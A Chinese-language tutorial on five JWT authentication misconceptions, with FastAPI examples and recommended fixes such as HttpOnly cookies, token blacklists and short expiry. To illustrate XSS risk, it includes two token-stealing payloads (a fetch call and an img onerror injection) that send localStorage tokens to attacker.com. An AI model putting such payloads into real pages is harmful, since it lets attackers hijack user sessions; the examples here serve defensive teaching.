# JWT认证 - 反直觉点

这些是关于 JWT 认证最常见的误区，很多开发者（包括有经验的）都会犯这些错误。

---

## 误区1：JWT 存在 localStorage 很安全 ❌

### 为什么错？

**JWT 存在 localStorage 容易被 XSS 攻击窃取。**

```javascript
// ❌ 错误做法：存在 localStorage
localStorage.setItem('access_token', jwt_token);

// 攻击者注入的恶意脚本可以轻易窃取
const stolen_token = localStorage.getItem('access_token');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolen_token })
});
```

**XSS（跨站脚本攻击）示例：**

```html
<!-- 攻击者在评论区注入恶意脚本 -->
<img src="x" onerror="
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'))
">
```

**正确做法：存在 HttpOnly Cookie**

```python
from fastapi import FastAPI, Response
from fastapi.responses import JSONResponse

app = FastAPI()

@app.post("/login")
async def login(username: str, password: str, response: Response):
    # 验证密码...
    token = create_access_token(user_id=123)

    # ✅ 存在 HttpOnly Cookie，JavaScript 无法访问
    response.set_cookie(
        key="access_token",
        value=token,
        httponly=True,      # ✅ 防止 JavaScript 访问
        secure=True,        # ✅ 只在 HTTPS 下传输
        samesite="lax",     # ✅ 防止 CSRF 攻击
        max_age=900         # 15分钟过期
    )

    return {"message": "登录成功"}
```

### 为什么人们容易这样错？

1. **localStorage 使用简单**：前端开发者习惯用 localStorage 存储数据
2. **误解 JWT 的安全性**：认为 JWT 有签名就是安全的（签名只防篡改，不防窃取）
3. **忽视 XSS 风险**：认为自己的网站不会有 XSS 漏洞（实际上很难完全避免）
4. **跨域问题**：Cookie 有跨域限制，localStorage 没有（但这不是理由）

### 正确理解

**JWT 的安全性分两个层面：**

1. **签名安全**：防止 Token 被篡改（✅ JWT 本身保证）
2. **存储安全**：防止 Token 被窃取（❌ 需要开发者保证）

**存储方案对比：**

| 存储方式 | XSS 风险 | CSRF 风险 | 跨域支持 | 推荐度 |
|---------|---------|----------|---------|--------|
| localStorage | ❌ 高 | ✅ 低 | ✅ 好 | ❌ 不推荐 |
| HttpOnly Cookie | ✅ 低 | ⚠️ 中 | ⚠️ 受限 | ✅ 推荐 |
| Memory (变量) | ✅ 低 | ✅ 低 | ❌ 差 | ⚠️ 刷新丢失 |

**最佳实践：**
- Access Token 存 HttpOnly Cookie（短期，15分钟）
- Refresh Token 存 HttpOnly Cookie（长期，7天）
- 配合 CSRF Token 防止 CSRF 攻击

---

## 误区2：JWT 可以随时撤销 ❌

### 为什么错？

**JWT 是无状态的，服务端不存储 Token，所以无法直接撤销。**

```python
# ❌ 错误理解：认为可以直接撤销 JWT
@app.post("/logout")
async def logout(token: str):
    # 这样做无效！JWT 仍然有效，直到过期
    # 服务端没有存储 Token，无法"删除"它
    return {"message": "登出成功"}  # ❌ 实际上 Token 还能用


# ✅ 正确做法：使用 Token 黑名单
from redis import Redis

redis_client = Redis()

@app.post("/logout")
async def logout(token: str, current_user: dict = Depends(get_current_user)):
    # 将 Token 加入黑名单（存到 Redis）
    payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    exp = payload.get("exp")

    # 黑名单只需要存到 Token 过期时间
    ttl = exp - int(datetime.utcnow().timestamp())
    redis_client.setex(f"blacklist:{token}", ttl, "1")

    return {"message": "登出成功"}


# 验证 Token 时检查黑名单
async def get_current_user(token: str):
    # 1. 检查黑名单
    if redis_client.exists(f"blacklist:{token}"):
        raise HTTPException(401, "Token 已被撤销")

    # 2. 验证签名和过期时间
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        return payload
    except jwt.JWTError:
        raise HTTPException(401, "无效的 Token")
```

### 为什么人们容易这样错？

1. **Session 思维惯性**：习惯了 Session 可以直接删除
2. **误解"无状态"**：认为无状态只是不存储用户信息，但可以存储 Token 状态
3. **忽视设计权衡**：JWT 的无状态设计就是为了避免服务端存储，撤销需要引入状态

### 正确理解

**JWT 的设计哲学：**
- **无状态 = 高性能**：不需要查询数据库或 Redis
- **无法撤销 = 无状态的代价**：要撤销就需要引入状态（黑名单）

**撤销方案对比：**

| 方案 | 实现难度 | 性能影响 | 适用场景 |
|------|---------|---------|---------|
| **不撤销** | 简单 | 无影响 | 低安全要求 |
| **短过期时间** | 简单 | 无影响 | 一般场景（推荐） |
| **Token 黑名单** | 中等 | 每次验证需查 Redis | 需要撤销能力 |
| **Token 版本号** | 中等 | 每次验证需查数据库 | 需要批量撤销 |
| **回到 Session** | 简单 | 每次验证需查存储 | 不需要 JWT 的优势 |

**推荐策略：**
```python
# 1. 短过期时间（15分钟）+ Refresh Token（7天）
access_token_expire = timedelta(minutes=15)   # 短期，即使泄露影响也小
refresh_token_expire = timedelta(days=7)      # 长期，只用于刷新

# 2. 只对 Refresh Token 使用黑名单
# Access Token 15分钟就过期，不需要黑名单
# Refresh Token 需要撤销能力（登出、修改密码时）

@app.post("/logout")
async def logout(refresh_token: str):
    # 只将 Refresh Token 加入黑名单
    redis_client.setex(f"blacklist:refresh:{refresh_token}", 7*24*3600, "1")
    return {"message": "登出成功"}
```

**类比：**
- JWT = 电影票，一旦发出就无法收回，只能等过期
- Session = 会员卡，可以随时注销
- Token 黑名单 = 挂失名单，检票时查一下是否挂失

---

## 误区3：JWT Payload 可以存敏感信息 ❌

### 为什么错？

**JWT Payload 只是 Base64 编码，任何人都能解码查看。**

```python
import base64
import json

# ❌ 错误做法：在 Payload 中存密码
payload = {
    "user_id": 123,
    "username": "alice",
    "password": "secret123",  # ❌ 危险！
    "credit_card": "1234-5678-9012-3456"  # ❌ 危险！
}

token = jwt.encode(payload, SECRET_KEY)
print(token)
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInVzZXJuYW1lIjoiYWxpY2UiLCJwYXNzd29yZCI6InNlY3JldDEyMyIsImNyZWRpdF9jYXJkIjoiMTIzNC01Njc4LTkwMTItMzQ1NiJ9.xxx


# 任何人都能解码 Payload（不需要密钥）
parts = token.split(".")
payload_encoded = parts[1]

# 补齐 Base64 padding
padding = 4 - len(payload_encoded) % 4
if padding != 4:
    payload_encoded += "=" * padding

# 解码
payload_decoded = base64.urlsafe_b64decode(payload_encoded)
payload_json = json.loads(payload_decoded)

print(payload_json)
# {'user_id': 123, 'username': 'alice', 'password': 'secret123', 'credit_card': '1234-5678-9012-3456'}
# ❌ 敏感信息完全暴露！
```

**正确做法：只存非敏感信息**

```python
# ✅ 正确做法：只存用户 ID 和基本信息
payload = {
    "user_id": 123,           # ✅ 用户 ID（公开）
    "username": "alice",      # ✅ 用户名（公开）
    "role": "admin",          # ✅ 角色（公开）
    "exp": 1234567890         # ✅ 过期时间（公开）
}

# 敏感信息从数据库查询
@app.get("/profile")
async def get_profile(current_user: dict = Depends(get_current_user)):
    user_id = current_user["user_id"]

    # 从数据库查询敏感信息
    user = await db.get_user(user_id)

    return {
        "username": user.username,
        "email": user.email,        # 从数据库查
        "phone": user.phone,        # 从数据库查
        # 不返回密码哈希
    }
```

### 为什么人们容易这样错？

1. **误解签名的作用**：认为签名会加密 Payload（实际上签名只防篡改，不加密）
2. **Base64 看起来像加密**：Base64 编码后看起来像乱码，误以为是加密
3. **方便性诱惑**：把所有信息都放 JWT 里很方便，不用查数据库

### 正确理解

**JWT 的三个部分：**

```
JWT = Header.Payload.Signature

Header:    Base64({"alg": "HS256", "typ": "JWT"})
Payload:   Base64({"user_id": 123, "username": "alice"})  ← 任何人都能解码
Signature: HMAC-SHA256(Header + Payload, secret_key)      ← 只有服务端能生成
```

**签名的作用：**
- ✅ 防止篡改：修改 Payload 后签名会失效
- ❌ 不加密：Payload 是明文（Base64 编码）

**类比：**
- JWT = 透明信封 + 防伪标签
  - 信封是透明的，任何人都能看到里面的内容（Payload）
  - 防伪标签保证信封没被打开过（Signature）
  - 但内容本身是公开的

**什么可以存在 JWT Payload？**

| 信息类型 | 是否可存 | 示例 |
|---------|---------|------|
| 用户 ID | ✅ 可以 | `user_id: 123` |
| 用户名 | ✅ 可以 | `username: "alice"` |
| 角色 | ✅ 可以 | `role: "admin"` |
| 权限列表 | ✅ 可以 | `permissions: ["read", "write"]` |
| 邮箱 | ⚠️ 谨慎 | 如果不介意公开可以存 |
| 密码（哈希） | ❌ 不可以 | 即使是哈希也不要存 |
| 信用卡号 | ❌ 不可以 | 绝对不能存 |
| API 密钥 | ❌ 不可以 | 绝对不能存 |
| 个人隐私 | ❌ 不可以 | 身份证号、手机号等 |

**如果需要加密怎么办？**

使用 JWE（JSON Web Encryption）而不是 JWT：

```python
# JWE 会加密 Payload
from jwcrypto import jwe, jwk

# 生成加密密钥
key = jwk.JWK.generate(kty='oct', size=256)

# 加密 Payload
payload = {"user_id": 123, "password": "secret"}
jwe_token = jwe.JWE(
    plaintext=json.dumps(payload).encode(),
    protected={"alg": "A256KW", "enc": "A256GCM"}
)
jwe_token.add_recipient(key)
encrypted_token = jwe_token.serialize()

# 解密需要密钥
# 攻击者无法解密 Payload
```

但在实际应用中，**更推荐的做法是：**
- JWT 只存非敏感信息（用户 ID、角色）
- 敏感信息从数据库查询
- 不要为了方便而牺牲安全

---

## 误区4：JWT 适合所有场景 ❌

### 为什么错？

**JWT 有其适用场景，不是银弹。**

**JWT 的优势：**
- ✅ 无状态，服务端不存储
- ✅ 跨域友好
- ✅ 适合微服务架构
- ✅ 适合移动端 APP

**JWT 的劣势：**
- ❌ Token 体积大（比 Session ID 大很多）
- ❌ 无法撤销（需要引入黑名单）
- ❌ 无法更新（需要重新签发）
- ❌ 安全性依赖客户端存储

### 什么时候不应该用 JWT？

**场景1：传统 Web 应用（服务端渲染）**

```python
# 传统 Web 应用更适合 Session
from starlette.middleware.sessions import SessionMiddleware

app.add_middleware(SessionMiddleware, secret_key="secret")

@app.get("/login")
async def login(request: Request, username: str, password: str):
    # 验证密码...
    request.session["user_id"] = 123
    return RedirectResponse("/dashboard")

@app.get("/dashboard")
async def dashboard(request: Request):
    user_id = request.session.get("user_id")
    if not user_id:
        return RedirectResponse("/login")
    # 渲染页面...
```

**为什么？**
- Session 更简单，不需要前端处理 Token
- Session 可以随时撤销
- Session 体积小（只存 Session ID）

**场景2：需要频繁撤销的场景**

```python
# 例如：在线协作工具，用户权限频繁变化
# 使用 Session 更合适

@app.post("/change-role")
async def change_role(user_id: int, new_role: str):
    # 修改用户角色
    await db.update_user_role(user_id, new_role)

    # Session 方式：立即生效
    # JWT 方式：需要等 Token 过期或强制刷新
```

**场景3：高安全要求的场景**

```python
# 例如：银行系统、支付系统
# 使用 Session + 短过期时间 + 二次验证

@app.post("/transfer")
async def transfer(
    request: Request,
    amount: float,
    to_account: str,
    otp_code: str  # 一次性密码
):
    # 1. 验证 Session
    user_id = request.session.get("user_id")
    if not user_id:
        raise HTTPException(401, "未登录")

    # 2. 验证 OTP
    if not verify_otp(user_id, otp_code):
        raise HTTPException(401, "OTP 验证失败")

    # 3. 执行转账
    await bank.transfer(user_id, to_account, amount)
```

### 什么时候应该用 JWT？

**场景1：前后端分离的 SPA**

```python
# React/Vue 前端 + FastAPI 后端
@app.post("/api/login")
async def login(username: str, password: str):
    # 返回 JWT
    token = create_access_token(user_id=123)
    return {"access_token": token}

# 前端存储 Token，每次请求带上
# Authorization: Bearer <token>
```

**场景2：移动端 APP**

```python
# iOS/Android APP + FastAPI 后端
# JWT 适合移动端，因为：
# - 不需要 Cookie（移动端 Cookie 支持不好）
# - 可以存在安全存储（Keychain/KeyStore）
# - 离线也能验证（如果有公钥）
```

**场景3：微服务架构**

```python
# API Gateway 验证 JWT，然后转发给内部服务
# 内部服务不需要再验证（信任 Gateway）

# Gateway
@app.get("/api/users")
async def get_users(current_user: dict = Depends(get_current_user)):
    # 验证 JWT
    # 转发给 User Service，带上用户信息
    return await user_service.get_users(current_user["user_id"])

# User Service（内部服务）
@app.get("/users")
async def get_users(user_id: int):
    # 不需要验证 JWT，信任 Gateway
    return await db.get_users()
```

**场景4：第三方 API 集成**

```python
# 提供 API 给第三方调用
# JWT 适合，因为：
# - 无状态，不需要存储 Session
# - 可以设置长过期时间（API Key 替代）
# - 可以包含权限信息（scope）

@app.post("/api/oauth/token")
async def get_token(client_id: str, client_secret: str):
    # 验证客户端...
    token = jwt.encode(
        {
            "client_id": client_id,
            "scope": ["read", "write"],
            "exp": datetime.utcnow() + timedelta(days=30)
        },
        SECRET_KEY
    )
    return {"access_token": token}
```

### 正确理解

**选择认证方案的决策树：**

```
是否需要无状态？
├─ 是 → 是否需要频繁撤销？
│   ├─ 是 → JWT + 黑名单 或 考虑 Session
│   └─ 否 → JWT ✅
└─ 否 → 是否是传统 Web 应用？
    ├─ 是 → Session ✅
    └─ 否 → 根据具体需求选择
```

**对比总结：**

| 特性 | JWT | Session | 推荐场景 |
|------|-----|---------|---------|
| 状态 | 无状态 | 有状态 | JWT: API, 微服务 |
| 撤销 | 困难 | 简单 | Session: 需要撤销 |
| 体积 | 大 | 小 | Session: 流量敏感 |
| 跨域 | 友好 | 受限 | JWT: 跨域 API |
| 移动端 | 友好 | 不友好 | JWT: 移动 APP |
| 安全性 | 依赖存储 | 服务端控制 | Session: 高安全 |

---

## 误区5：Access Token 过期时间越长越好 ❌

### 为什么错？

**过期时间是安全性和用户体验的权衡。**

```python
# ❌ 错误做法：Access Token 过期时间太长
access_token = jwt.encode(
    {"user_id": 123},
    SECRET_KEY,
    expires_delta=timedelta(days=30)  # ❌ 30天太长
)

# 问题：
# 1. Token 泄露后，攻击者可以使用30天
# 2. 用户权限变化后，需要等30天才能生效
# 3. 无法及时撤销


# ✅ 正确做法：短 Access Token + 长 Refresh Token
access_token = jwt.encode(
    {"user_id": 123, "type": "access"},
    SECRET_KEY,
    expires_delta=timedelta(minutes=15)  # ✅ 15分钟
)

refresh_token = jwt.encode(
    {"user_id": 123, "type": "refresh"},
    REFRESH_SECRET_KEY,
    expires_delta=timedelta(days=7)  # ✅ 7天
)
```

### 为什么人们容易这样错？

1. **用户体验优先**：不想让用户频繁登录
2. **实现简单**：单 Token 比双 Token 简单
3. **忽视安全风险**：认为 HTTPS 就足够安全

### 正确理解

**过期时间的权衡：**

| 过期时间 | 安全性 | 用户体验 | 适用场景 |
|---------|--------|---------|---------|
| 5分钟 | ⭐⭐⭐⭐⭐ | ⭐ | 高安全场景（银行） |
| 15分钟 | ⭐⭐⭐⭐ | ⭐⭐⭐ | 一般场景（推荐） |
| 1小时 | ⭐⭐⭐ | ⭐⭐⭐⭐ | 低安全场景 |
| 1天 | ⭐⭐ | ⭐⭐⭐⭐⭐ | 内部工具 |
| 30天 | ⭐ | ⭐⭐⭐⭐⭐ | ❌ 不推荐 |

**推荐配置：**

```python
# AI Agent API 推荐配置
ACCESS_TOKEN_EXPIRE_MINUTES = 15   # Access Token: 15分钟
REFRESH_TOKEN_EXPIRE_DAYS = 7      # Refresh Token: 7天

# 高安全场景（支付、银行）
ACCESS_TOKEN_EXPIRE_MINUTES = 5    # Access Token: 5分钟
REFRESH_TOKEN_EXPIRE_DAYS = 1      # Refresh Token: 1天

# 内部工具（低安全要求）
ACCESS_TOKEN_EXPIRE_MINUTES = 60   # Access Token: 1小时
REFRESH_TOKEN_EXPIRE_DAYS = 30     # Refresh Token: 30天
```

---

## 总结

这5个误区是 JWT 认证中最常见的陷阱：

1. **存储误区**：JWT 不要存 localStorage，用 HttpOnly Cookie
2. **撤销误区**：JWT 无法直接撤销，需要黑名单或短过期时间
3. **加密误区**：JWT Payload 是明文，不要存敏感信息
4. **场景误区**：JWT 不是银弹，要根据场景选择
5. **过期误区**：Access Token 要短期，配合 Refresh Token

**记住：**
- JWT 的签名只防篡改，不防窃取，不加密
- JWT 的无状态是优势也是劣势
- 安全性和便利性需要权衡
- 没有完美的方案，只有合适的方案
